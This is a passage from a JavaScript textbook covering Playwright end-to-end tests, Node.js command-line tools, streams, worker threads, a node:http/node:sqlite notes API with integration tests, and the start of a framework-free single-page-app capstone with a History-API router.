ℹ suites 0
ℹ pass 2
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 71.636519
```

The debounce test checks the behaviour at 299 ms and at 300 ms exactly — impossible to do reliably with real timers. (The warning says that the mock-timers API is still experimental in Node 22.) Mocks registered through `t.mock` are restored automatically when the test ends.

### Pattern

**P-14. Test mostly at the level where bugs are cheapest to find and the tests are fastest and most stable — many unit tests of logic, fewer integration tests of modules talking to each other, and a small number of end-to-end tests of the critical user journeys — and mock only what you do not own or cannot control (time, randomness, the network, payment providers).** *(Mike Cohn, the "test pyramid"; Kent C. Dodds, "The Testing Trophy" — weight towards integration tests for UI code)* *Trade-off:* heavily mocked unit tests can all pass while the pieces fail to work together; end-to-end tests catch that, at the cost of speed and some flakiness.

## Topic 15B — End-to-end tests

## Unit 15.4 — Testing in a real browser

**One-line summary:** End-to-end tests drive a real browser through the real application; Playwright Test finds elements by role and accessible name (`getByRole("button", { name: "Send" })`) — which tests accessibility at the same time — waits automatically for elements to become actionable, retries assertions until they pass or time out ("web-first" assertions), and records a trace of every step when a test fails.

The project is the example.

### Mastery check

1. **Explain.** Why is `page.getByRole("button", { name: "Send" })` a better locator than `page.locator("#f > button")`?

## Chapter 15 Project — An end-to-end suite for the autocomplete component

### Requirements

Write Playwright Test tests for Chapter 8's `<auto-complete>`, served by Chapter 0's static server, which the test runner starts by itself. Cover: the accessible name and initial state; filtering that ignores case and accents; keyboard selection, `aria-selected`, and form submission; Escape and the rule that free text is not a value; and mouse selection. Use only role-based locators.

### Reference solution

```js
// file: e2e/playwright.config.js
import { defineConfig } from "@playwright/test";

export default defineConfig({
  testDir: ".",
  reporter: "list",
  use: { baseURL: "http://localhost:8140", trace: "retain-on-failure" },   // a full trace when a test fails
  webServer: {                                                              // start the app before the tests
    command: "node ../../ch00/project/static.mjs ../../ch08/project 8140",
    url: "http://localhost:8140/demo.html",
  },
});
```

```js
// file: e2e/autocomplete.spec.js
// End-to-end tests of Chapter 8's <auto-complete>, written the way a user perceives the page:
// by role and accessible name, not by CSS classes or shadow-DOM structure.
import { test, expect } from "@playwright/test";

test.beforeEach(async ({ page }) => { await page.goto("/demo.html"); });

test("is a combobox named by its label", async ({ page }) => {
  const box = page.getByRole("combobox", { name: "Country" });
  await expect(box).toBeVisible();
  await expect(box).toHaveAttribute("aria-expanded", "false");
});

test("typing shows matching options, ignoring case and accents", async ({ page }) => {
  await page.getByRole("combobox", { name: "Country" }).fill("OSTER");
  await expect(page.getByRole("option")).toHaveText(["Österreich (Austria)"]);
});

test("arrow keys and Enter choose an option, and the form submits it", async ({ page }) => {
  const box = page.getByRole("combobox", { name: "Country" });
  await box.pressSequentially("ge");
  await expect(page.getByRole("option")).toHaveCount(4);
  await box.press("ArrowDown");
  await box.press("ArrowDown");
  await expect(page.getByRole("option", { name: "Georgia" })).toHaveAttribute("aria-selected", "true");
  await box.press("Enter");
  await expect(box).toHaveValue("Georgia");
  const submitted = page.waitForEvent("console", (m) => m.text().startsWith("submitted"));
  await page.getByRole("button", { name: "Send" }).click();
  expect((await submitted).text()).toBe('submitted: {"country":"Georgia"}');
});

test("Escape closes the list; free text is not a value", async ({ page }) => {
  const box = page.getByRole("combobox", { name: "Country" });
  await box.fill("ni");
  await box.press("Escape");
  await expect(page.getByRole("listbox")).toBeHidden();
  const invalid = page.waitForEvent("console", (m) => m.text().startsWith("invalid"));
  await page.getByRole("button", { name: "Send" }).click();
  await invalid;                                              // required, and "ni" was never chosen
});

test("a mouse user can pick an option", async ({ page }) => {
  await page.getByRole("combobox", { name: "Country" }).fill("ger");
  await page.getByRole("option", { name: "Nigeria" }).click();
  await expect(page.getByRole("combobox", { name: "Country" })).toHaveValue("Nigeria");
});
```

```console
$ cd e2e && npx playwright test | cat

Running 5 tests using 1 worker

  ✓  1 autocomplete.spec.js:8:1 › is a combobox named by its label (189ms)
  ✓  2 autocomplete.spec.js:14:1 › typing shows matching options, ignoring case and accents (232ms)
  ✓  3 autocomplete.spec.js:19:1 › arrow keys and Enter choose an option, and the form submits it (287ms)
  ✓  4 autocomplete.spec.js:33:1 › Escape closes the list; free text is not a value (261ms)
  ✓  5 autocomplete.spec.js:43:1 › a mouse user can pick an option (213ms)

  5 passed (1.9s)
```

All five pass, in about two seconds including starting the server. None of the tests knows that the input lives in a shadow root, or what its classes are: the locators go through the accessibility tree, so the tests survive refactoring of the markup — and fail if the component stops being accessible (for example, if the `<label>` lost its connection to the input, `getByRole("combobox", { name: "Country" })` would find nothing). The assertions such as `toHaveCount(4)` retry until the list has rendered, so there are no `sleep` calls to tune.

### Deep & Tricky

**DT-43. Most flaky end-to-end tests are timing bugs in the test: reading state once (`expect(await locator.count()).toBe(4)`) races with rendering, while the web-first form (`await expect(locator).toHaveCount(4)`) retries until the condition holds; likewise, listening for an event *after* triggering it (`await click(); await page.waitForEvent(...)`) can miss it, which is why the tests above create the `waitForEvent` promise before clicking.** *(Playwright documentation, "Assertions — auto-retrying assertions" and "Events — waitForEvent"; Luo et al., "An empirical analysis of flaky tests", FSE 2014: async waits are the most common root cause)*

### Review checklist

- Break the component on purpose (remove `aria-selected`, or the `pointerdown` handler) and check that exactly the expected tests fail. A test that never fails tests nothing.
- Add a test for the review item from Chapter 8 about announcing the number of suggestions.
- Which of these tests would you also run in Firefox and WebKit, and why?

## Answers to the Chapter 15 prediction questions

**Unit 15.1, Q1.** No: `assert/strict`'s `equal` uses `Object.is`, and the number 3600000 is not the string `"3600000"` — the loose `assert.equal` from plain `node:assert` would have passed, which is why the strict variant is used.

**Unit 15.4, Q1.** It describes what the user sees and what assistive technology announces, so it survives markup changes that do not change the experience, and it fails when the button loses its accessible name — a real bug that a CSS-path locator would never notice.

# Chapter 16 — Node.js

*Goal: use JavaScript outside the browser with the same care as inside it. Node.js runs JavaScript on the libuv event loop with APIs for processes, files, networks, and threads. This chapter writes a command-line tool with proper arguments, exit codes, and error output; processes a 200-MiB file in constant memory with streams (and measures the difference); shows a CPU-bound request freezing a server and a worker thread fixing it; and builds a REST API on `node:http` and `node:sqlite` with validation, pagination, ETags, consistent errors, graceful shutdown, and integration tests.*

**What you will be able to do after this chapter**

- Write command-line programs that follow Unix conventions: arguments, standard streams, exit codes.
- Process large data with streams and backpressure.
- Keep servers responsive by moving CPU-bound work to worker threads.
- Structure an HTTP API: routing, body limits, validation, errors, pagination, caching headers.
- Shut servers down gracefully and test them against a real port.

## Topic 16A — Programs

## Unit 16.1 — Command-line programs

**One-line summary:** A Node.js program gets its arguments in `process.argv` (parsed with `util.parseArgs`), reads `process.stdin` and writes `process.stdout`/`process.stderr`, and reports success or failure through its exit code — 0 for success, non-zero for failure — which shells, scripts, and CI pipelines rely on.

```js
// file: cli/wc.mjs
// A small command-line tool: count lines, words, and characters of files or of standard input.
import { parseArgs } from "node:util";
import { createReadStream } from "node:fs";
import { createInterface } from "node:readline";

let values, positionals;
try {
  ({ values, positionals } = parseArgs({
    allowPositionals: true,
    options: { lines: { type: "boolean", short: "l" }, words: { type: "boolean", short: "w" },
               help: { type: "boolean", short: "h" } },
  }));
} catch (e) {
  console.error(`wc: ${e.message.split(".")[0]}. Try --help.`);
  process.exit(2);                                      // 2: wrong usage, by Unix convention
}
if (values.help) {
  console.log("usage: node wc.mjs [-l] [-w] [file ...]   (reads standard input if no file is given)");
  process.exit(0);
}

async function count(stream) {
  let lines = 0, words = 0, chars = 0;
  for await (const line of createInterface({ input: stream, crlfDelay: Infinity })) {
    lines++;
    words += line.split(/\s+/).filter(Boolean).length;
    chars += [...line].length + 1;
  }
  return { lines, words, chars };
}

let failed = false;
for (const name of positionals.length ? positionals : ["-"]) {
  try {
    const stream = name === "-" ? process.stdin : createReadStream(name);
    const c = await count(stream);
    const shown = values.lines ? [c.lines] : values.words ? [c.words] : [c.lines, c.words, c.chars];
    console.log(shown.map((n) => String(n).padStart(7)).join("") + (name === "-" ? "" : ` ${name}`));
  } catch (e) {
    console.error(`wc: ${name}: ${e.code === "ENOENT" ? "no such file" : e.message}`);   // errors go to stderr
    failed = true;
  }
}
process.exitCode = failed ? 1 : 0;                      // let pending output flush, then exit with this code
```

```console
$ cd cli && node wc.mjs wc.mjs
     45    254   1791 wc.mjs
$ cd cli && printf 'one two\nthree\n' | node wc.mjs -w
      3
$ cd cli && node wc.mjs nope.txt wc.mjs; echo "exit status $?"
wc: nope.txt: no such file
     45    254   1791 wc.mjs
exit status 1
$ cd cli && node wc.mjs --bogus; echo "exit status $?"
wc: Unknown option '--bogus'. Try --help.
exit status 2
```

A missing file is reported on standard error, the other files are still counted, and the exit status is 1; a usage error exits with 2. Setting `process.exitCode` instead of calling `process.exit()` lets buffered output finish writing — `process.exit()` can cut off output written to a pipe.

### Mastery check

1. **Predict.** `node wc.mjs nope.txt > out.txt` — what is in `out.txt`, and what appears on the terminal?

## Unit 16.2 — Streams and backpressure

**One-line summary:** Streams process data in chunks as it arrives, so memory use stays constant however large the input; a writable stream's `write()` returns `false` when its buffer is full, and a producer must wait for `"drain"` (backpressure) — `pipeline()` and `for await` over a readable stream handle it automatically.

```js
// file: streams/make-log.mjs
// Writes a 200 MB access log, respecting backpressure: wait for "drain" when the buffer is full.
import { createWriteStream } from "node:fs";
import { once } from "node:events";

const out = createWriteStream("access.log");
let bytes = 0, i = 0;
while (bytes < 200 * 2 ** 20) {
  const status = i % 50 === 0 ? 500 : i % 7 === 0 ? 404 : 200;
  const line = `2026-11-16T10:${String(i % 60).padStart(2, "0")}:00Z GET /item/${i % 9973} ${status} ${100 + (i % 900)}\n`;
  bytes += line.length; i++;
  if (!out.write(line)) await once(out, "drain");     // write() returned false: the buffer is full
}
out.end();
await once(out, "finish");
console.log(`wrote ${i} lines, ${Math.round(bytes / 2 ** 20)} MiB`);
```

```js
// file: streams/errors.mjs
// Count 5xx responses in the log two ways, and compare peak memory.
import { readFile } from "node:fs/promises";
import { createReadStream } from "node:fs";
import { createInterface } from "node:readline";

const mode = process.argv[2];
const t0 = performance.now();
let errors = 0;
if (mode === "readFile") {
  const text = await readFile("access.log", "utf8");             // the whole file in memory at once
  for (const line of text.split("\n")) if (line.split(" ")[3]?.startsWith("5")) errors++;
} else {
  const lines = createInterface({ input: createReadStream("access.log"), crlfDelay: Infinity });
  for await (const line of lines) if (line.split(" ")[3].startsWith("5")) errors++;   // 64 KiB at a time
}
console.log(`${mode.padEnd(10)} ${errors} errors in ${Math.round(performance.now() - t0)} ms, ` +
            `peak memory ${Math.round(process.resourceUsage().maxRSS / 1024)} MiB`);
```

```console
$ cd streams && node make-log.mjs && node errors.mjs readFile && node errors.mjs stream && rm access.log
wrote 4778364 lines, 200 MiB
readFile   95568 errors in 1823 ms, peak memory 720 MiB
stream     95568 errors in 1829 ms, peak memory 77 MiB
```

Both versions take about the same time, but reading the whole 200-MiB file needs about 700 MiB of memory — the bytes, the decoded string (UTF-16 internally can double it), and the array of lines — while the stream needs under 80 MiB, and would need the same for a 200-GiB file.

### Deep & Tricky

**DT-44. Ignoring the return value of `write()` does not lose data — Node keeps buffering — so a producer faster than its consumer (a fast generator writing to a slow socket or disk) silently grows the buffer until the process runs out of memory, sometimes hours later in production. Honour `false` by awaiting `"drain"`, or use `stream.pipeline()`/`Readable.from()`, which do it for you.** *(Node.js documentation, "Stream — Backpressuring in streams" and `writable.write()`: "the return value is false if the stream wishes for the calling code to wait for the 'drain' event")*

## Unit 16.3 — One thread, many requests: worker threads

**One-line summary:** A Node.js server handles thousands of connections on one thread because waiting for I/O costs nothing — but any CPU-bound computation in a request handler blocks every other request until it finishes; `worker_threads` runs such work on other threads, with its own event loop, communicating by messages.

```js
// file: workers/server.mjs
// CPU-heavy work on the main thread blocks EVERY request; a worker thread does not.
import http from "node:http";
import { Worker } from "node:worker_threads";

const fib = (n) => (n < 2 ? n : fib(n - 1) + fib(n - 2));
const inWorker = (n) => new Promise((resolve, reject) => {
  const w = new Worker(new URL("./fib-worker.mjs", import.meta.url), { workerData: n });
  w.once("message", resolve);
  w.once("error", reject);
});

http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  const n = Number(url.searchParams.get("n") ?? 38);
  if (url.pathname === "/ping") return res.end("pong");
  if (url.pathname === "/fib") return res.end(String(fib(n)));                 // blocks the event loop
  if (url.pathname === "/fib-worker") return res.end(String(await inWorker(n))); // runs on another thread
  res.writeHead(404).end();
}).listen(8150);
```

```js
// file: workers/fib-worker.mjs
import { parentPort, workerData } from "node:worker_threads";
const fib = (n) => (n < 2 ? n : fib(n - 1) + fib(n - 2));
parentPort.postMessage(fib(workerData));
```

```js
// file: workers/probe.mjs
// Starts one slow computation, and meanwhile measures how long /ping takes, every 100 ms.
const base = "http://localhost:8150";
for (const path of ["/fib", "/fib-worker"]) {
  const t0 = performance.now();
  const slow = fetch(`${base}${path}?n=40`).then((r) => r.text())
    .then((v) => console.log(`  ${path} finished after ${Math.round(performance.now() - t0)} ms (fib = ${v})`));
  const pings = [];
  for (let i = 0; i < 5; i++) {
    await new Promise((r) => setTimeout(r, 100));
    const t = performance.now();
    await fetch(`${base}/ping`).then((r) => r.text());
    pings.push(Math.round(performance.now() - t));
  }
  await slow;
  console.log(`${path.padEnd(11)} /ping latencies while it ran: ${pings.join(", ")} ms`);
}
```

```console
$ cd workers && { node server.mjs & S=$!; sleep 0.5; node probe.mjs; kill $S; }
  /fib finished after 909 ms (fib = 102334155)
/fib        /ping latencies while it ran: 783, 2, 2, 2, 2 ms
  /fib-worker finished after 906 ms (fib = 102334155)
/fib-worker /ping latencies while it ran: 2, 3, 2, 2, 5 ms
```

While `fib(40)` runs on the main thread, a request for `/ping` — which does no work at all — waits most of a second; the later pings are fast only because the computation has finished. With the worker, every ping is answered in a few milliseconds. (A production server would keep a pool of workers rather than starting one per request.)

### Mastery check

1. **Explain.** Why does `await`-ing a slow database query in a handler *not* block other requests, while `fib(40)` does?

## Topic 16B — Servers

## Unit 16.4 — Structure of an HTTP API

**One-line summary:** Under every framework, an API is a function from request to response: route by method and path, parse and limit the body, validate it, run the operation, and map every outcome — including bugs — to a status code and a consistent JSON error, without leaking internal details; frameworks such as Express, Fastify, and Hono add routing tables, middleware, and plugins on top of exactly this.

The project is the example.

### Pattern

**P-15. Validate at the boundary and trust inside: parse and validate every external input (bodies, query strings, headers, environment variables) into typed values as soon as it enters, return 4xx with specific messages for bad input, and turn unexpected exceptions into a logged 500 with a generic message.** *(Practice; OWASP "Input Validation Cheat Sheet"; RFC 9457 "Problem Details for HTTP APIs" for a standard error format)* *Trade-off:* strict validation (for example, rejecting unknown properties) makes API evolution harder — clients sending a new field break against old servers — so some APIs ignore unknown fields instead; choose deliberately and document it.

## Chapter 16 Project — A notes API

### Requirements

Build a REST API for notes with `node:http` and the built-in `node:sqlite`:

- `GET /notes` with cursor pagination (`limit`, `after`, and a `next` link); `POST /notes` (201 with `Location`); `GET /notes/:id` with an ETag and `304` support; `DELETE /notes/:id`.
- JSON bodies only (415 otherwise), at most 10 kB (413), valid JSON (400), validated with Chapter 10's schema library (422 listing every problem).
- 404 and 405 where appropriate; every error is `{ "error": … }`; unexpected exceptions become a logged 500.
- Graceful shutdown on `SIGTERM`.
- Integration tests against a real server on a random port.

### Reference solution

```js
// file: project/app.mjs
// A JSON REST API for notes: node:http, node:sqlite, validation, pagination, ETags, and
// consistent errors. createApp() returns the server so that tests can start it on any port.
import http from "node:http";
import { DatabaseSync } from "node:sqlite";
import { createHash } from "node:crypto";
import { object, string, literal } from "../../ch10/project/schema.ts";   // Chapter 10's validator

const NewNote = object({ title: string({ min: 1 }), body: string(), status: literal("draft", "published").optional() });
const MAX_BODY = 10_000;

class HttpError extends Error {
  constructor(status, message, details) { super(message); this.status = status; this.details = details; }
}

async function readJson(req) {
  if (!/^application\/json\b/.test(req.headers["content-type"] ?? "")) throw new HttpError(415, "expected application/json");
  let size = 0; const chunks = [];
  for await (const chunk of req) {
    size += chunk.length;
    if (size > MAX_BODY) throw new HttpError(413, `body larger than ${MAX_BODY} bytes`);
    chunks.push(chunk);
  }
  try { return JSON.parse(Buffer.concat(chunks).toString("utf8")); }
  catch { throw new HttpError(400, "body is not valid JSON"); }
}

export function createApp(dbPath = ":memory:") {
  const db = new DatabaseSync(dbPath);
  db.exec(`CREATE TABLE IF NOT EXISTS notes (
             id INTEGER PRIMARY KEY, title TEXT NOT NULL, body TEXT NOT NULL,
             status TEXT NOT NULL DEFAULT 'draft', updated TEXT NOT NULL)`);
  const q = {
    page: db.prepare("SELECT * FROM notes WHERE id > ? ORDER BY id LIMIT ?"),
    one: db.prepare("SELECT * FROM notes WHERE id = ?"),
    insert: db.prepare("INSERT INTO notes (title, body, status, updated) VALUES (?, ?, ?, ?) RETURNING *"),
    remove: db.prepare("DELETE FROM notes WHERE id = ?"),
  };
  const send = (res, status, data, headers = {}) => {
    res.writeHead(status, { "Content-Type": "application/json", ...headers });
    res.end(data === undefined ? undefined : JSON.stringify(data));
  };

  const server = http.createServer(async (req, res) => {
    const url = new URL(req.url, "http://x");
    const id = /^\/notes\/(\d+)$/.exec(url.pathname)?.[1];
    try {
      if (url.pathname === "/notes" && req.method === "GET") {
        const limit = Math.min(Number(url.searchParams.get("limit") ?? 20), 100);
        const after = Number(url.searchParams.get("after") ?? 0);
        const items = q.page.all(after, limit);
        const next = items.length === limit ? `/notes?limit=${limit}&after=${items.at(-1).id}` : null;
        return send(res, 200, { items, next });                 // cursor pagination: stable under inserts
      }
      if (url.pathname === "/notes" && req.method === "POST") {
        const r = NewNote.parse(await readJson(req));
        if (!r.ok) throw new HttpError(422, "invalid note", r.errors);
        const note = q.insert.get(r.value.title, r.value.body, r.value.status ?? "draft", new Date().toISOString());
        return send(res, 201, note, { Location: `/notes/${note.id}` });
      }
      if (id && req.method === "GET") {
        const note = q.one.get(Number(id));
        if (!note) throw new HttpError(404, `note ${id} not found`);
        const etag = `"${createHash("sha1").update(JSON.stringify(note)).digest("hex").slice(0, 16)}"`;
        if (req.headers["if-none-match"] === etag) return send(res, 304, undefined, { ETag: etag });
        return send(res, 200, note, { ETag: etag });
      }
      if (id && req.method === "DELETE") {
        const { changes } = q.remove.run(Number(id));
        if (!changes) throw new HttpError(404, `note ${id} not found`);
        return send(res, 204);
      }
      throw new HttpError(url.pathname === "/notes" || id ? 405 : 404, `${req.method} ${url.pathname} is not supported`);
    } catch (e) {
      if (!(e instanceof HttpError)) console.error(e);         // a bug: log it, but never leak details
      const status = e instanceof HttpError ? e.status : 500;
      send(res, status, { error: status === 500 ? "internal error" : e.message, ...(e.details && { details: e.details }) });
    }
  });
  server.on("close", () => db.close());
  return server;
}
```

```js
// file: project/main.mjs
// Runs the API, and shuts down gracefully: on SIGTERM (what Docker, Kubernetes, and systemd send)
// stop accepting connections, let requests in progress finish, then exit.
import { createApp } from "./app.mjs";

const server = createApp(process.env.DB ?? "notes.db");
server.listen(Number(process.env.PORT ?? 8160), () => console.log(`listening on ${server.address().port}`));
for (const signal of ["SIGTERM", "SIGINT"])
  process.on(signal, () => {
    console.log(`${signal}: closing`);
    server.close(() => { console.log("all connections closed; bye"); process.exit(0); });
    server.closeIdleConnections();                         // keep-alive connections that are doing nothing
    setTimeout(() => { console.log("forcing exit"); process.exit(1); }, 10_000).unref();
  });
```

```js
// file: project/api.test.mjs
// Integration tests: a real server on a random free port, a fresh in-memory database per run.
import { before, after, describe, it } from "node:test";
import assert from "node:assert/strict";
import { createApp } from "./app.mjs";

let base, server;
before(() => new Promise((r) => { server = createApp().listen(0, () => { base = `http://localhost:${server.address().port}`; r(); }); }));
after(() => new Promise((r) => server.close(r)));
const json = (method, path, body, headers = {}) => fetch(base + path, {
  method, headers: { "Content-Type": "application/json", ...headers }, body: body && JSON.stringify(body) });

describe("notes API", () => {
  it("creates a note and returns it with a Location", async () => {
    const res = await json("POST", "/notes", { title: "First", body: "hello" });
    assert.equal(res.status, 201);
    assert.equal(res.headers.get("location"), "/notes/1");
    assert.equal((await res.json()).status, "draft");
  });
  it("rejects invalid notes with every problem listed", async () => {
    const res = await json("POST", "/notes", { title: "", body: 5, status: "secret", extra: 1 });
    assert.equal(res.status, 422);
    assert.deepEqual((await res.json()).details, [
      "$.title: shorter than 1", "$.body: expected string, got number",
      `$.status: expected one of ["draft","published"]`, "$.extra: unexpected property"]);
  });
  it("refuses wrong content types, bad JSON, and huge bodies", async () => {
    assert.equal((await fetch(base + "/notes", { method: "POST", body: "title=x" })).status, 415);
    assert.equal((await fetch(base + "/notes", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{" })).status, 400);
    assert.equal((await json("POST", "/notes", { title: "x", body: "y".repeat(20_000) })).status, 413);
  });
  it("paginates with a cursor", async () => {
    for (let i = 2; i <= 5; i++) await json("POST", "/notes", { title: `Note ${i}`, body: "" });
    const first = await (await fetch(`${base}/notes?limit=2`)).json();
    const second = await (await fetch(base + first.next)).json();
    assert.deepEqual(first.items.map((n) => n.id), [1, 2]);
    assert.deepEqual(second.items.map((n) => n.id), [3, 4]);
  });
  it("supports conditional GET", async () => {
    const res = await fetch(`${base}/notes/1`);
    const again = await fetch(`${base}/notes/1`, { headers: { "If-None-Match": res.headers.get("etag") } });
    assert.equal(again.status, 304);
  });
  it("deletes, then 404s", async () => {
    assert.equal((await fetch(`${base}/notes/1`, { method: "DELETE" })).status, 204);
    const res = await fetch(`${base}/notes/1`);
    assert.equal(res.status, 404);
    assert.deepEqual(await res.json(), { error: "note 1 not found" });
  });
  it("answers 405 and 404 for unknown methods and paths", async () => {
    assert.equal((await fetch(`${base}/notes`, { method: "PUT" })).status, 405);
    assert.equal((await fetch(`${base}/nothing`)).status, 404);
  });
});
```

```console
$ cd project && node --disable-warning=ExperimentalWarning --test --test-reporter=spec api.test.mjs
▶ notes API
  ✔ creates a note and returns it with a Location (22.934433ms)
  ✔ rejects invalid notes with every problem listed (4.404301ms)
  ✔ refuses wrong content types, bad JSON, and huge bodies (10.206849ms)
  ✔ paginates with a cursor (14.956806ms)
  ✔ supports conditional GET (9.896778ms)
  ✔ deletes, then 404s (6.250783ms)
  ✔ answers 405 and 404 for unknown methods and paths (5.01941ms)
✔ notes API (75.836618ms)
ℹ tests 7
ℹ suites 1
ℹ pass 7
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 227.748911
$ cd project && { DB=:memory: node --disable-warning=ExperimentalWarning main.mjs & S=$!; sleep 0.5; curl -s -X POST -H "Content-Type: application/json" -d '{"title":"From curl","body":"hi"}' localhost:8160/notes; echo; curl -s localhost:8160/notes; echo; kill -TERM $S; wait $S; echo "exit status $?"; }
listening on 8160
{"id":1,"title":"From curl","body":"hi","status":"draft","updated":"2026-11-16T10:58:56.344Z"}
{"items":[{"id":1,"title":"From curl","body":"hi","status":"draft","updated":"2026-11-16T10:58:56.344Z"}],"next":null}
SIGTERM: closing
all connections closed; bye
exit status 0
```

The tests run against a fresh in-memory database on port 0, which asks the operating system for any free port — so they can run in parallel with other test files and never collide with a server that is already running. The validation comes straight from Chapter 10: a `.ts` module imported from a `.mjs` file, which Node.js 22 runs by stripping the types. On `SIGTERM`, the server stops accepting connections, finishes what is in flight, closes the database, and exits with status 0 — what container orchestrators expect during a rolling deployment.

### Deep & Tricky

**DT-45. `server.close()` stops new connections but waits for existing ones to end, and HTTP keep-alive connections from clients (browsers, proxies, load balancers) may stay open, idle, for minutes — so a server that only calls `close()` can hang on shutdown until the orchestrator kills it. Close idle keep-alive connections explicitly (`server.closeIdleConnections()`, Node 18.2+), and set a deadline after which the process exits anyway.** *(Node.js documentation, `server.close()` and `server.closeIdleConnections()`; Kubernetes documentation, "Pod termination": SIGTERM, then SIGKILL after the grace period, 30 s by default)*

### Review checklist

- Add `PATCH /notes/:id` with `If-Match` for optimistic concurrency: refuse the update (412) if the note changed since the client read it.
- Offset pagination (`?page=3`) is simpler. What goes wrong with it when notes are inserted while a client pages through?
- Where would you put authentication? Write it as a function that wraps the handler.

## Answers to the Chapter 16 prediction questions

**Unit 16.1, Q1.** `out.txt` is empty (there is no output for a missing file), and the error message appears on the terminal, because only standard output was redirected.

**Unit 16.3, Q1.** The query runs in the database (or in libuv's thread pool for some I/O); the handler's `await` returns control to the event loop, which serves other requests meanwhile. `fib(40)` is JavaScript running on the event loop's own thread, so nothing else can run until it returns.

# Chapter 17 — Capstone: A Single-Page Application Without a Framework

*Goal: build a complete, accessible, tested single-page application from the parts made in this book — and in doing so, learn exactly what front-end frameworks do. The app is a notes manager: Chapter 16's API and Chapter 10's validator on the server, Chapter 6's signals for shared state, a History-API router with focus management and request cancellation, views that build DOM without ever parsing HTML strings, Chapter 4-style layered CSS, and a Playwright suite (Chapter 15) that tests the whole journey through the accessibility tree. It is about 10 kB of code, 4 kB compressed, with no build step.*

**What you will be able to do after this chapter**

- Structure a single-page application: server, API client, router, state, and views.
- Implement client-side routing correctly: links, history, deep links, back and forward, cancellation, focus.
- Keep a dynamic application accessible: titles, focus, live announcements, landmarks.
- Test an application end to end, and judge when a framework is worth its cost.

## Topic 17A — Design

## Unit 17.1 — What a framework gives you

**One-line summary:** Frameworks such as React, Vue, Svelte, and Angular bundle answers to a handful of questions — how to turn state into DOM and keep them in sync, how to route between views, how to load data and handle loading and error states, how to compose components, and how to build and ship the code — and every one of those questions can be answered with the platform features of this book, at the cost of writing and maintaining the answers yourself.

| Concern | Framework answer | This chapter's answer |
| --- | --- | --- |
| Rendering state to DOM | Virtual DOM diffing, or compiled fine-grained updates | Rebuild each view's subtree with `replaceChildren`; `effect()` for shared state |
| Routing | A router package | `router.js`: History API, 50 lines |
| Data loading | Hooks, loaders, query caches | `async` views with an `AbortSignal` per navigation |
| Components | Component model, props, slots | Functions returning elements; custom elements where encapsulation helps (Chapter 8) |
| Escaping | Automatic in templates | `h()` uses `textContent` and properties — it cannot parse HTML |
| Build | Bundler, dev server | None: native ES modules (a build would add hashing and minification, Chapter 9) |

## Unit 17.2 — The server

**One-line summary:** The server reuses the API from Chapter 16 by mounting its request handler under `/api`, serves the app's static files, and answers any other extension-less path with `index.html`, so that a deep link such as `/notes/3` works when it is reloaded or shared — the router in the browser then decides what to show.

```js
// file: capstone/server.mjs
// Serves the single-page app and mounts Chapter 16's notes API under /api.
// Any other GET that is not a file returns index.html, so deep links like /notes/3 work on reload.
import http from "node:http";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { createApp } from "../../ch16/project/app.mjs";

const api = createApp(process.env.DB ?? ":memory:");             // its request handler, reused
const handleApi = api.listeners("request")[0];
const ROOT = path.resolve("public");
const LIBS = { "/lib/signals.mjs": "../../ch06/project/signals.mjs" };   // Chapter 6's reactive library
const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".mjs": "text/javascript", ".css": "text/css" };

http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  if (url.pathname.startsWith("/api/")) {                         // /api/notes -> /notes
    req.url = req.url.slice(4);
    return handleApi(req, res);
  }
  const file = LIBS[url.pathname] ?? path.join(ROOT, path.normalize(url.pathname));
  const send = (body, f) => res.writeHead(200, { "Content-Type": TYPES[path.extname(f)] ?? "text/plain" }).end(body);
  try {
    if (!LIBS[url.pathname] && !file.startsWith(ROOT + path.sep)) throw new Error("outside root");
    send(await readFile(file), file);
  } catch {
    if (req.method === "GET" && !path.extname(url.pathname)) return send(await readFile(path.join(ROOT, "index.html")), "x.html");
    res.writeHead(404).end("not found");
  }
}).listen(Number(process.env.PORT ?? 8170), () => console.log("capstone on http://localhost:8170/"));
```

## Topic 17B — The client

## Unit 17.3 — The router

**One-line summary:** A client-side router intercepts clicks on same-origin links (but not modified clicks, new-tab links, or in-page anchors), updates the URL with `history.pushState`, renders the matching view, listens to `popstate` for Back and Forward, aborts the requests of the view being left, and moves keyboard focus to the new content so that screen-reader and keyboard users know the page changed.

```js
// file: capstone/public/router.js
// A History-API router: intercepts same-origin link clicks, matches paths to views,
// aborts the previous view's requests, restores scroll on back/forward, and moves focus.
export function createRouter(routes, outlet, { onNavigate = () => {} } = {}) {
  let controller = null;
  async function render(url, { focus = true } = {}) {
    controller?.abort();                                     // stop loading the page we are leaving
    controller = new AbortController();
    const path = new URL(url, location.origin).pathname;
    for (const [pattern, view] of routes) {
      const m = pattern.exec(path);
      if (!m) continue;
      outlet.setAttribute("aria-busy", "true");
      try {
        await view({ outlet, params: m.groups ?? {}, signal: controller.signal, navigate });
      } catch (e) {
        if (e.name === "AbortError") return;                 // superseded by a newer navigation
        outlet.replaceChildren(Object.assign(document.createElement("p"), { textContent: `Error: ${e.message}` }));
      } finally { outlet.removeAttribute("aria-busy"); }
      if (focus) { outlet.tabIndex = -1; outlet.focus(); }   // screen readers start at the new content
      onNavigate(path);
      return;
    }
  }
  function navigate(url, { replace = false } = {}) {
    history[replace ? "replaceState" : "pushState"](null, "", url);
    return render(url);
  }
  document.addEventListener("click", (e) => {
    const a = e.target.closest("a[href]");
    if (!a || a.origin !== location.origin || a.target || e.ctrlKey || e.metaKey || e.shiftKey || e.button !== 0) return;
    if (a.hash && a.pathname === location.pathname) return;  // in-page anchors (the skip link)
    e.preventDefault();
    navigate(a.href);
  });
  addEventListener("popstate", () => render(location.href));
  return { start: () => render(location.href, { focus: false }), navigate };
}
```

### Deep & Tricky

**DT-46. A full page load tells assistive technology that the page changed — it announces the new title and starts reading from the top — but a client-side route change is just a DOM update, silent and with focus left on the link that no longer exists. Single-page applications must therefore update `document.title`, move focus to the new main content (or its heading), and announce changes through a live region; otherwise screen-reader users click a link and hear nothing at all.** *(WCAG 2.2 Success Criteria 2.4.2 "Page Titled" and 4.1.3 "Status Messages"; Marcy Sutton et al., "What we learned from user testing of accessible client-side routing techniques", Fable Tech Labs/Gatsby, 2019)*

